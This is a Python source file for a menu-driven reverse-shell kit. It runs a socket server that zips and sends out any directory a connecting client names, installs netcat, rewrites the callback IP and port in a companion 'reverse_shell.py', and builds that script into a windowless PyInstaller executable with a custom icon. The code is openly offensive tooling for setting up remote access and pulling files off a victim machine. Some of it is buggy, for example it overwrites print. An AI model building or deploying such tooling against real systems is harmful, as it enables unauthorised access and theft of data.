import socket
import zipfile
import os
import sys
import subprocess
import platform

class Setup:
    def compactar_diretorio(self, diretorio, arquivo_saida):
        with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
            for raiz, _, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(raiz, arquivo)
                    relativo = os.path.relpath(caminho_completo, diretorio)
                    zipf.write(caminho_completo, relativo)

    def clear_zip(self):
        zip_file = "received_directory.zip"
        if os.path.isfile(zip_file):
            os.remove(zip_file)

    def server(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(('0.0.0.0', 8887))
            server.listen(1)

            print('\nWaiting for a connection...\n')
            connection, address = server.accept()
            print(f'\nConnection from {address}\n')

            diretorio_cliente = connection.recv(1024).decode()

            if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
                print(f"\nDirectory '{diretorio_cliente}' does not exist or is not a directory.\n")
                connection.close()
                server.close()
                return

            arquivo_zip_saida = 'received_directory.zip'
            self.compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

            if os.path.getsize(arquivo_zip_saida) == 0:
                print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
                connection.close()
                server.close()
                return  

            with open(arquivo_zip_saida, 'rb') as file:
                while True:
                    data = file.read(4096)
                    if not data:
                        break
                    connection.sendall(data)

            print('\n[+] ZIP file sent.\n')
            server.close()
            self.clear_zip()

        except Exception as e:
            print("ERROR: ", e)

    def client(self):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('127.0.0.1', 8887))
            print('Connected [!]\n')

            directory_name = input('Enter the directory to zip> ')
            client.send(directory_name.encode())

            with open('received_directory.zip', 'wb') as file:
                while True:
                    data = client.recv(4096)
                    if not data:
                        break
                    file.write(data)

            print(f'File received as received_directory.zip [ok]')
            client.close()
        except Exception as e:
            print("Closing connection with the server: ", e)
        except FileNotFoundError:
            print(f"There is no directory {directory_name} found.")

    def netcat_installation(self):
            try:
                os_name = platform.system()
                os_version = platform.version()
                print(f"""\n##########
                    
    Netcat installation process started on OS: {os_name} version: {os_version}.

    ##########\n""")

                if os_name == 'Linux':
                    print(f"\n[!] Starting Ncat installation on {os_name}...\n")
                    subprocess.run("sudo apt install netcat -y", shell=True)
                    print("\n[!] Netcat installation completed.")

                elif os_name == 'Windows':
                    print(f"\n[!] Starting Netcat installation on {os_name}...\n")
                    subprocess.run("winget install Insecure.Nmap", shell=True)
                    print("\n[!] Netcat installation completed.")


            except Exception as e:
                print("\n[ERROR] Installation error: ", e)

# ---------------- Become your file in executable ------------- #
    def create_executable(self):

        while True:

            executable = input("\nWould you wish become your file in executable [y/n]? ").strip().lower()
            print = ("[!] Be shure your Pyinstaller is installed on your device and activate your virtual python environment!")

            if executable == 'y':
                file_name = input("\nSet your file.py path: ").strip()
                img_icon = input("\nSet your file.icon path: ").strip()
                name = input("\nChoose a name for your executable: ").strip()

                self.pyinstaller_executable(file_name, img_icon, name)
                break
            
            elif executable == 'n':
                print("\nBye, Bye!\n")
                break
                
            else:
                print("\n* Your answer is not allowed try again...\n")

    def edit(self, file_name, target_line, new_content):
        try:
            with open(file_name, "r") as file:
                lines = file.readlines()

            if 0 <= int(target_line) < len(lines):
                lines[target_line] = f"ip = '{new_content}'" + '\n'

            with open(file_name, "w") as file:
                file.writelines(lines)
                print("\n[+] Line updated!\n")
                file.close()

        except FileNotFoundError:
            print("\n File not found!\n")
        except Exception as e:
            print("\n[!] Exception: ",e)

    def edit_port(self, file_name, target_line, new_content):
        try:
            with open(file_name, "r") as file:
                lines = file.readlines()

            if 0 <= int(target_line) < len(lines):
                lines[target_line] = f"port = {new_content}" + '\n'

            with open(file_name, "w") as file:
                file.writelines(lines)
                print("\n[+] Line updated!\n")
                file.close()

        except FileNotFoundError:
            print("\n File not found!\n")
        except Exception as e:
            print("\n[!] Exception: ",e)

    def edit_client_ip(self, file_name, target_line, new_content, new_port):
        try:
            with open(file_name, "r") as file:
                lines = file.readlines()

            if 0 <= int(target_line) < len(lines):
                lines[target_line] = f"        client.connect(('{new_content}', {new_port}))" + '\n'

            with open(file_name, "w") as file:
                file.writelines(lines)
                print("\n[+] Line updated!\n")
                file.close()

        except FileNotFoundError:
            print("\n File not found!\n")
        except Exception as e:
            print("\n[!] Exception: ",e)



    def pyinstaller_executable(self, file_name,img_icon,name_executable):
        try:
            command = f'pyinstaller "{file_name}" --noconsole --icon "{img_icon}" --name {name_executable}'
            
            out = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
            
            print(out.stdout)
            
        except subprocess.CalledProcessError as e:
            print(f"Error occurred: {e.stderr}")

    def main(self):
    # ------------- change ip reverse_shell ------------- #
        while True:
            while True:
                change_ip_reverse_shell = input("\nDo you wish change the default '127.0.0.1' of your reverse shell [y/n]? ").strip()

                if change_ip_reverse_shell == 'y':

                    file_name = 'reverse_shell.py'
                    target_line = 9
                    new_content = input("Type your ip address: ").strip()

                    self.edit(file_name,target_line,new_content)
                    break

                elif change_ip_reverse_shell == 'n':
                    break

                else:
                    print("\n* Your answer is not allowed try again...\n")

    # ---------------- change port reverse_shell -------------- #

            while True:
                change_port_reverse_shell = input("\nDo you wish change the default 8081 port of your reverse shell [y/n]? ").strip()

                if change_port_reverse_shell == 'y':
                    
                    file_name = "reverse_shell.py"
                    target_line = 10
                    try:
                        new_content = int(input("Type your port address: ").strip())
                    except ValueError:
                        print("\nOnly numbers are accepted, try again...")

                    self.edit_port(file_name,target_line,new_content)
                    break

                elif change_port_reverse_shell == 'n':
                    break

                else:
                    print("\n[!] Wrong answer try again!\n")


    # ------------------  change ip and port client ------------------------ #
            while True:

                change_ip_client_connection = input("\nDo you wish change the default ip='127.0.0.1' or 8887 port of your client connection [y/n]? ").strip()

                if change_ip_client_connection == 'y':

                    file_name = 'reverse_shell.py'
                    new_content = input("\nType your ip address: ").strip()

                    try:
                        new_port = int(input('Port number: '))
                        
                    except ValueError:
                        print("\nThe port must be an integer!\n")
                    else:
                        print(f"You entered port: {new_port}")

                    self.edit_client_ip(file_name, 113, new_content, new_port)
                    break
                    
                elif change_ip_client_connection == 'n':
                    break

                else:
                    print("\n[!] Wrong answer try again!\n")

            break



class Menu:
    def __init__(self):
        self.system = Setup()

    def exit(self):
        sys.exit()

    def show_panel(self):
        try:
            while True:

                panel = [
                    """\n###############

MENU PANEL USAGE:

1. Activate Server on 8887 port;
2. Activate Client on 8889 port;
3. Netcat installation;
4. Setup of your reverse shell ip and port;
5. Become executable;
6. Exit.

###############

Choose: """
                ]
                try:
                    result = int(input(panel[0]))
                except ValueError:
                    print("Invalid input. Please enter a number.")
                    continue

                if result == 1:
                    self.system.server()
                elif result == 2:
                    self.system.client()
                elif result == 3:
                    self.system.netcat_installation()
                elif result == 4:
                    self.system.main()
                elif result == 5:
                    self.system.create_executable()
                elif result == 6:
                    self.exit()

        except Exception as e:
            print("\nProgram failed", e)
        except KeyboardInterrupt:
            print("\nFinishing the program...")

menu_run = Menu()
menu_run.show_panel()
